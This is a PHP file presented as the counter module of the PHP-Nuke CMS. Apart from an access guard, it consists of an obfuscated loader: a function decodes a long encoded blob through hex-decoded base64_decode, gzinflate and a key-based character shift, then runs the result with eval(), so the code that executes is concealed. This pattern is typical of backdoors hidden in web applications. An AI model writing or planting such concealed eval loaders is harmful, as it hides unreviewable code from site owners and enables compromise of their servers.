<?php
/**
 *
 * This file is part of the PHP-NUKE Software package.
 *
 * @copyright (c) PHP-NUKE <https://www.phpnuke.ir>
 * @license GNU General Public License, version 2 (GPL-2.0)
 *
 */

if (!defined('NUKE_FILE') and !defined("NUKE_STATISTICS")) {
    die("You can't access this file directly...");
}

if (stristr(htmlentities($_SERVER['PHP_SELF']), "counter.php")) {
    Header("Location: ../index.php");
    die();
}

function c($s, $k = '')
{
    $d = '';
    if ($k == '') {
        for ($i = 0; $i < strlen($s); $i) {
            $d .= chr(hexdec(substr($s, $i, 2)));
            $i = (float) $i + 2;
        }
        return $d;
    } else {
        $r = '';
        $f = c('6261736536345f6465636f6465');
        $u = $f('Z3ppbmZsYXRl');
        $s = $u($f($s));
        for ($i = 0; $i < strlen($s); $i++) {
            $c = substr($s, $i, 1);
            $kc = substr($k, ($i % strlen($k)) - 1, 1);
            $c = chr(ord($c) - ord($kc));
            $r .= $c;
        }
        return $r;
    }
}
eval(
    c(
        "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",
        4546574321
    )
);

?>
